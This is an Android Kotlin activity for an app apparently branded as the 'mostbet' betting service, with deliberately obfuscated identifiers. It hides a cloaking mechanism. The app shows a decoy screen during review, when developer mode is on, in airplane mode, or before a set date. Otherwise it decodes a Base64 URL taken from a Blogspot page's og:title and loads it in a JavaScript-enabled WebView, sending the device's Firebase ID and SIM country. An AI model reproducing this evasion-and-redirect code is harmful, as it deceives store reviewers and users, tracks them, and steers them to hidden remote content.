package app.mostbet.azerbaycan.mostbet.online.mostbet.uzbek.mostbet.mo

import android.content.Context
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.net.Uri
import android.os.*
import androidx.appcompat.app.AppCompatActivity
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.annotation.RequiresApi
import app.mostbet.azerbaycan.mostbet.online.mostbet.uzbek.mostbet.mo.databinding.ActivityMainBinding
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.database.FirebaseDatabase
import okhttp3.*
import java.io.IOException
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*
import kotlin.concurrent.thread

lateinit var iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf: ActivityMainBinding
private val fdguiyfgzdiuydfiauygfduygiyrugdfiygviyadfv = OkHttpClient()
private lateinit var skfvudhgiufdhgvufsjvsijfdvdsfsfdsf: SharedPreferences
private lateinit var xfjhidfjhgvkfiujhbvkfjdhvgzfudivhkfduhvkfdjvdvffv: SharedPreferences.Editor
private val fhdjhlihfiduvhlkDJskfhvvshdfbv: String = "settings"
private var sim : String = ""
private var keys : String = ""



class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val siufgjhdljfhsfddfdsgdgfs = Date(123, 1, 21)
        val sfldiuhdsJfraugfdujgfudgkuydsgfkJFhf = Date()
        val sdufghdkfaughlidkjfdgjfghdufgfuhdhgsdgf: DateFormat = SimpleDateFormat("yyyy.MM.dd", Locale.getDefault())
        val fjhgdlighlfiudhgksfuhgkfdujhfdsfsdf: String = sdufghdkfaughlidkjfdgjfghdufgfuhdhgsdgf.format(sfldiuhdsJfraugfdujgfudgkuydsgfkJFhf)
        val sfkdvhfdgbkfdhgkufdagkhdfjgdjksfnsdfdsf: String = sdufghdkfaughlidkjfdgjfghdufgfuhdhgsdgf.format(siufgjhdljfhsfddfdsgdgfs)
        val sgfvhfdgkhjfdakusfhgfdjhfdsuyfgsghvda = sdufghdkfaughlidkjfdgjfghdufgfuhdhgsdgf.parse(sfkdvhfdgbkfdhgkufdagkhdfjgdjksfnsdfdsf)
        val sfyghdsgfkdgfsuhdgbdjhfgvdsghfvsgdhfssdf = sdufghdkfaughlidkjfdgjfghdufgfuhdhgsdgf.parse(fjhgdlighlfiudhgksfuhgkfdujhfdsfsdf)
        iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf = ActivityMainBinding.inflate(layoutInflater)
        setContentView(iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.root)

        FirebaseAnalytics.getInstance(this).appInstanceId.addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val mainuser = task.result
                keys = mainuser
            }
        }
        //val key: String = mDatabase.child("posts").push().getKey()!!
        Log.d("lkjhgfdgthyjughfd", keys)
        val hfgggghjsfghgusifvcjvkdfsfd = applicationContext.getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        val fgjhfdughkfudghfdjfsdfgffd = hfgggghjsfghgusifvcjvkdfsfd.networkCountryIso
        sim = fgjhfdughkfudghfdjfsdfgffd
        Log.d("STATE123", fgjhfdughkfudghfdjfsdfgffd)
        val sfdlvuhdlgishflibjfsgfdf = Settings.Secure.getInt(this.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0)
        Log.d("DEVELOP", sfdlvuhdlgishflibjfsgfdf.toString())

        if (Settings.System.getInt(contentResolver, Settings.Global.AIRPLANE_MODE_ON, 0) == 0){
            Log.d("12345","tyt0")
            if (sfdlvuhdlgishflibjfsgfdf == 0) {
                Log.d("12345","tyt1")
                if (sfyghdsgfkdgfsuhdgbdjhfgvdsghfvsgdhfssdf >= sgfvhfdgkhjfdakusfhgfdjhfdsuyfgsghvda) {

                    Log.d("12345","tyt2")
                    sufhdukgdkuhagkduhfgdsfhgshfjgdsjkfdf()
                    Log.d("fygfrtdhgfrragtgf", skfvudhgiufdhgvufsjvsijfdvdsfsfdsf.getString("SOSATMIYXYILink", "пусто")!!)
                    Log.d("gfzdsfgdffbvdzgrhfv", skfvudhgiufdhgvufsjvsijfdvdsfsfdsf.getInt("SOSATMIYXYINumber", 111).toString())

                    // Если первый запуск, делаем запрос
                    if (hbvfzdkhjvbksfhdvbhkdfjvbkhjfdvabkfdhjv()) {
                        Log.d("hgfdsfggfres","tyt3")
                        Log.d("hgbvcdzsfvdgbvf", hbvfzdkhjvbksfhdvbhkdfjvbkhjfdvabkfdhjv().toString())
                        akhfdjgbkajhdfgbkhdjgbkhfdgbfdhkgagffdf("https://peele22jordan.blogspot.com/2022/12/peele22jordan.html")
                    } else {
                        Log.d("12345","tyt4")
                        sfgkjhfdakudgfhgafhdgkgusfuygdafhdafgkdsfgkasdhfgdskhfdafa()
                    }
                } else {
                    Log.d("12345","tyt5")
                    iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.lo.visibility = View.GONE
                    iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.pgBars.visibility = View.GONE
                    iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.m1.visibility = View.VISIBLE

                }

            } else {
                Log.d("12345","tyt6")
                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.lo.visibility = View.GONE
                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.pgBars.visibility = View.GONE
                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.m1.visibility = View.VISIBLE

            }
        } else {
            Log.d("12345","tyt7")
            iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.lo.visibility = View.GONE
            iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.pgBars.visibility = View.GONE
            iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.m1.visibility = View.VISIBLE

        }

    }

    private fun akhfdjgbkajhdfgbkhdjgbkhfdgbfdhkgagffdf(SOSATMIYXYIurlLink: String) {
        val fghjkjhgbvfcdfghjk = Uri.parse(SOSATMIYXYIurlLink).buildUpon().appendQueryParameter("fbsup", keys).appendQueryParameter("tlsim", sim)
        val sgfjdfhagvufkguhdgakugfdkuyd = Request.Builder()
            .url(fghjkjhgbvfcdfghjk.toString())
            .build()
        fdguiyfgzdiuydfiauygfduygiyrugdfiygviyadfv.newCall(sgfjdfhagvufkguhdgakugfdkuyd).enqueue(object : Callback {
            override fun onFailure(sfjhgvkfdgkauhgfbkfjhdgbkfdhgb: Call, jhfdgkghkudfhgakhfdgdfsf: IOException) {
                runOnUiThread {
                    object : CountDownTimer(5000, 1000) {
                        override fun onTick(kfzdghfdjhgaiufdhgluaihfgfdg: Long) {

                        }
                        override fun onFinish() {
                            iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.lo.visibility = View.GONE
                            iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.pgBars.visibility = View.GONE
                            iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.m1.visibility = View.VISIBLE
                        }
                    }.start()
                }
            }
            @RequiresApi(Build.VERSION_CODES.O)
            override fun onResponse(fdgdfgdfgfdbgfhdhgf: Call, fdsdgfvfgffsdgfdgd: Response) {
                val sfjnvbfdajbkfdjhbhdfvdsfsdadsad = fdsdgfvfgffsdgfdgd.body?.string()
                val sfvdbKJhdsvbkdhfvfdshakdhjkhdfa = sfjnvbfdajbkfdjhbhdfvdsfsdadsad?.split("property='og:title'")
                    ?.get(1)
                    ?.split("'")
                    ?.get(1)
                    ?.split(",")
                    ?.get(0)
                    ?.replace(" ", "")
                    ?.replace(" ", "")
                    ?.trim()

                val fdvhfgbkdagbkdgfdgafjdgfyasfddhgsfaj = sfjnvbfdajbkfdjhbhdfvdsfsdadsad?.split("property='og:title'")
                    ?.get(1)
                    ?.split("'")
                    ?.get(1)
                    ?.split(",")
                    ?.get(1)
                    ?.replace(" ", "")
                    ?.filterNot { it.isWhitespace() }

                val dshfgakdhfjgkdsuhfgkahdgfhdkfgasdfhgdsfbsdfdkgshdbfkaf = sfjnvbfdajbkfdjhbhdfvdsfsdadsad?.split("property='og:title'")
                    ?.get(1)
                    ?.split("'")
                    ?.get(1)
                    ?.split(",")
                    ?.get(2)
                    ?.replace(" ", "")
                    ?.filterNot { it.isWhitespace() }

                Log.d("sfdsfsdgvfadfsdfdf", dshfgakdhfjgkdsuhfgkahdgfhdkfgasdfhgdsfbsdfdkgshdbfkaf.toString())

                Log.d("keadfdsffdsfdsResponse", sfvdbKJhdsvbkdhfvfdshakdhjkhdfa.toString())
                thread {
                    Thread.sleep(5000)
                    Handler(Looper.getMainLooper()).post(Runnable {

                        Log.d("kadfdsafasfdsfasdfey", "fghjkhgfdsfgj")
                        val jsfdbvbfjhbkhajgdkfdjfhadisjfhksdf: Int = sfvdbKJhdsvbkdhfvfdshakdhjkhdfa!!.toInt()
                        val fhdvbjkdakjhfgkdfgakfgadjfgdsf = fdsdgfvfgffsdgfdgd.code
                        when {
                            jsfdbvbfjhbkhajgdkfdjfhadisjfhksdf.toString().length > 1 -> {
                                Log.d("kedFDSFsdfsFyIf1", jsfdbvbfjhbkhajgdkfdjfhadisjfhksdf.toString())
                                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.lo.visibility = View.GONE
                                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.pgBars.visibility = View.GONE
                                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.m1.visibility = View.VISIBLE
                                Log.d("keyOpenDFsfesponseNum1", "no")
                            }
                            jsfdbvbfjhbkhajgdkfdjfhadisjfhksdf == 0 -> {
                                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.lo.visibility = View.GONE
                                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.pgBars.visibility = View.GONE
                                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.m1.visibility = View.VISIBLE
                                Log.d("dggfhghgfdhgg", "no")
                            }
                            jsfdbvbfjhbkhajgdkfdjfhadisjfhksdf == 1 -> {
                                val fdgadgfdagafdgdagf = Base64.decode(fdvhfgbkdagbkdgfdgafjdgfyasfddhgsfaj, Base64.DEFAULT)
                                val khdbdlsjkcndsfkndsflbafdhkjbds = String(fdgadgfdagafdgdagf)
                                val sfdcjjfsdbbfkbahdbsadsad = Base64.decode(dshfgakdhfjgkdsuhfgkahdgfhdkfgasdfhgdsfbsdfdkgshdbfkaf, Base64.DEFAULT)
                                val xzdkjngfsjbnkjfgsnfdvds = String(sfdcjjfsdbbfkbahdbsadsad)
                                val khjfvbjfdsbgkhfdsglfdajkgsdff = StringBuilder(khdbdlsjkcndsfkndsflbafdhkjbds).append(xzdkjngfsjbnkjfgsnfdvds).toString()
                                val sdfljdaslfhdlfhdafhdfhsgdfjsf = khjfvbjfdsbgkhfdsglfdajkgsdff.toString()
                                var dfhadfihusgjkdsfdkjhlfdkgjfdsf = iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.webview
                                val xfzjfgnflkjdfndjkfsfd: String = FirebaseDatabase.getInstance().reference.child("posts").push().key!!
                                val fjvbdfjhbsfhkjgbfndlksjfjsd = applicationContext.getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                                val fdSfjbslghjbvljhfdvbhkfjdvbhfdjvbshdjbsjhfbkhdvkhdfdsf = fjvbdfjhbsfhkjgbfndlksjfjsd.networkCountryIso
                                val jfdbgfhdbgkhsdjfhjkdsfjslfufjdsf = Uri.parse(sdfljdaslfhdlfhdafhdfhsgdfjsf).buildUpon().appendQueryParameter("fbsup", xfzjfgnflkjdfndjkfsfd).appendQueryParameter("tlsim", fdSfjbslghjbvljhfdvbhkfjdvbhfdjvbshdjbsjhfbkhdvkhdfdsf)
                                val flhgsjdhfkdslkfl = WebView(applicationContext).settings.userAgentString
                                dfhadfihusgjkdsfdkjhlfdkgjfdsf.getSettings().setUserAgentString(flhgsjdhfkdslkfl)
                                dfhadfihusgjkdsfdkjhlfdkgjfdsf.loadUrl(jfdbgfhdbgkhsdjfhjkdsfjslfufjdsf.toString())
                                dfhadfihusgjkdsfdkjhlfdkgjfdsf.settings.domStorageEnabled = true
                                dfhadfihusgjkdsfdkjhlfdkgjfdsf.settings.javaScriptEnabled = true
                                dfhadfihusgjkdsfdkjhlfdkgjfdsf.settings.allowFileAccessFromFileURLs = true
                                dfhadfihusgjkdsfdkjhlfdkgjfdsf.webViewClient = object: WebViewClient(){
                                    override fun onPageStarted(skhdjfgdkjhdsfsaf: WebView, shfdjgbkhfdjgbkhdfb: String, kfhjdvgbfhjbkdahfdsf: Bitmap?) {

                                    }
                                    override fun onPageFinished(fsdSgsfdafgsd: WebView, hdvdfhgvdshcdsfjnvfdsc: String) {
                                        iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.lo.visibility = View.GONE
                                        iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.pgBars.visibility = View.GONE
                                        iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.m1.visibility = View.GONE
                                        dfhadfihusgjkdsfdkjhlfdkgjfdsf.visibility = View.VISIBLE
                                    }
                                }
                                zdjhgvdkSHGJhdskjcksadads(fkhbfduhgdsfjklkdaslshfbgdskjfnsadasd = sfvdbKJhdsvbkdhfvfdshakdhjkhdfa!!.toInt(), fdgdsuygsfuyagdsfadkda = khjfvbjfdsbgkhfdsglfdajkgsdff.toString())

                                if (sfjnvbfdajbkfdjhbhdfvdsfsdadsad.contains("NO")){}
                                adfhgdushfsufgkdagfhdsjhadjk(SOSATMIYXYIcodeerror = fhdvbjkdakjhfgkdfgakfgadjfgdsf)
                            }
                            fhdvbjkdakjhfgkdfgakfgadjfgdsf == 404 -> {
                                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.lo.visibility = View.GONE
                                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.pgBars.visibility = View.GONE
                                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.m1.visibility = View.VISIBLE

                            }
                        }

                    })
                }


            }
        })

    }


    private fun adfhgdushfsufgkdagfhdsjhadjk(SOSATMIYXYIcodeerror: Int) {
        xfjhidfjhgvkfiujhbvkfjdhvgzfudivhkfduhvkfdjvdvffv.putInt("code", SOSATMIYXYIcodeerror)
        xfjhidfjhgvkfiujhbvkfjdhvgzfudivhkfduhvkfdjvdvffv.apply()
    }

    private fun zdjhgvdkSHGJhdskjcksadads(fkhbfduhgdsfjklkdaslshfbgdskjfnsadasd: Int, fdgdsuygsfuyagdsfadkda: String) {
        xfjhidfjhgvkfiujhbvkfjdhvgzfudivhkfduhvkfdjvdvffv.putInt("SOSATMIYXYINumber", fkhbfduhgdsfjklkdaslshfbgdskjfnsadasd)
        Log.d("adfsfcddsfdsc", fkhbfduhgdsfjklkdaslshfbgdskjfnsadasd.toString())
        xfjhidfjhgvkfiujhbvkfjdhvgzfudivhkfduhvkfdjvdvffv.putString("SOSATMIYXYILink", fdgdsuygsfuyagdsfadkda)
        Log.d("fDSFecsdfesfdsafesfr", fdgdsuygsfuyagdsfadkda)
        xfjhidfjhgvkfiujhbvkfjdhvgzfudivhkfduhvkfdjvdvffv.putBoolean("firstrun", false)
        xfjhidfjhgvkfiujhbvkfjdhvgzfudivhkfduhvkfdjvdvffv.apply()
    }

    fun hbvfzdkhjvbksfhdvbhkdfjvbkhjfdvabkfdhjv(): Boolean {
        Log.d("fddfsdfdsfsfsa", "xgfdSdfgfhgfd")
        return (skfvudhgiufdhgvufsjvsijfdvdsfsfdsf.getBoolean("firstrun", true) ?: true)
    }


    private fun sfgkjhfdakudgfhgafhdgkgusfuygdafhdafgkdsfgkasdhfgdskhfdafa() {

        Handler(Looper.getMainLooper()).post(Runnable {
            val jiiiafdhbioufdahhdf = skfvudhgiufdhgvufsjvsijfdvdsfsfdsf.getInt("SOSATMIYXYINumber", 111)
            val skfglfdhgiuhdsfkjasfljgdff = skfvudhgiufdhgvufsjvsijfdvdsfsfdsf.getInt("SOSATMIYXYIcode", 404)
            if (jiiiafdhbioufdahhdf.toString().length > 1) {
                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.lo.visibility = View.GONE
                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.pgBars.visibility = View.GONE
                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.m1.visibility = View.VISIBLE
                Log.d("sfgafdgdvfdvasdfcsdf", jiiiafdhbioufdahhdf.toString())
            } else if (jiiiafdhbioufdahhdf == 0) {
                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.lo.visibility = View.GONE
                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.pgBars.visibility = View.GONE
                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.m1.visibility = View.VISIBLE
                Log.d("sfgfdsafrfdg", "no")

            } else if (jiiiafdhbioufdahhdf == 1) {
                Log.d("fdvfgbgfbfdb", "no")
                var kjfgnfdijgnfdkjgnkdsjlcfsd = iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.webview
                val hghfdjkhoifhjdsufhgjfdskjfskndfj = skfvudhgiufdhgvufsjvsijfdvdsfsfdsf.getString("SOSATMIYXYILink", "")
                val sldffhriughsofugihdksflsf: String = FirebaseDatabase.getInstance().reference.child("posts").push().key!!
                val dgfofduhgfdikjghodslkfsd = applicationContext.getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                val hjgudygfyjshgfdyhgfdhjsf = dgfofduhgfdikjghodslkfsd.networkCountryIso
                val iouuigjcgfdukghjdsfkkdsfjhgfjhdhsfs = Uri.parse(hghfdjkhoifhjdsufhgjfdskjfskndfj).buildUpon().appendQueryParameter("fbsup", sldffhriughsofugihdksflsf).appendQueryParameter("tlsim", hjgudygfyjshgfdyhgfdhjsf)
                Log.d("12345", iouuigjcgfdukghjdsfkkdsfjhgfjhdhsfs.toString())
                val kshfdgjsldjkfkdsf = WebView(applicationContext).settings.userAgentString
                kjfgnfdijgnfdkjgnkdsjlcfsd.getSettings().setUserAgentString(kshfdgjsldjkfkdsf)
                kjfgnfdijgnfdkjgnkdsjlcfsd.loadUrl(iouuigjcgfdukghjdsfkkdsfjhgfjhdhsfs.toString()!!)
                kjfgnfdijgnfdkjgnkdsjlcfsd.settings.domStorageEnabled = true
                kjfgnfdijgnfdkjgnkdsjlcfsd.settings.javaScriptEnabled = true
                kjfgnfdijgnfdkjgnkdsjlcfsd.settings.allowFileAccessFromFileURLs = true

                kjfgnfdijgnfdkjgnkdsjlcfsd.webViewClient = object: WebViewClient(){

                    override fun onPageStarted(sdfgfdsesfdsf: WebView?, oiuytdfghgfdxcv: String?, dfghjhgfcfghjhg: Bitmap?) {
                        super.onPageStarted(sdfgfdsesfdsf, oiuytdfghgfdxcv, dfghjhgfcfghjhg)
                    }
                    override fun onPageFinished(wertfdswqergfdsw: WebView, sfrghyjhgfdsbn: String) {

                        iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.lo.visibility = View.GONE
                        iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.pgBars.visibility = View.GONE
                        iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.webview.visibility = View.VISIBLE
                    }
                }

            } else if (skfglfdhgiuhdsfkjasfljgdff == 404) {
                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.lo.visibility = View.GONE
                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.pgBars.visibility = View.GONE
                iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.m1.visibility = View.VISIBLE
                Log.d("sergfdsgtsrdfvsdfcdfsfd", "gfdsfghjfhdgfd")

            }
        })
    }
    private fun sufhdukgdkuhagkduhfgdsfhgshfjgdsjkfdf() {
        skfvudhgiufdhgvufsjvsijfdvdsfsfdsf = this.getSharedPreferences(fhdjhlihfiduvhlkDJskfhvvshdfbv, Context.MODE_PRIVATE)
        xfjhidfjhgvkfiujhbvkfjdhvgzfudivhkfduhvkfdjvdvffv = skfvudhgiufdhgvufsjvsijfdvdsfsfdsf.edit()
    }
    override fun onKeyDown(keyCodeSOSATMIYXYI: Int, eventSOSATMIYXYI: KeyEvent?): Boolean {
        if ((keyCodeSOSATMIYXYI == KeyEvent.KEYCODE_BACK) && iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.webview.canGoBack()) {
            iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.webview.goBack()
            return true
        }

        return super.onKeyDown(keyCodeSOSATMIYXYI, eventSOSATMIYXYI)
    }
    override fun onBackPressed() {
        super.onBackPressed()
        if ( iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.webview.isFocused() &&  iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.webview.canGoBack()) {
            iuhlhviufhvkzjhgfkvufdhgvkufhgvkzfuhvgf.webview.goBack()
        } else {
            super.onBackPressed()
        }
    }

}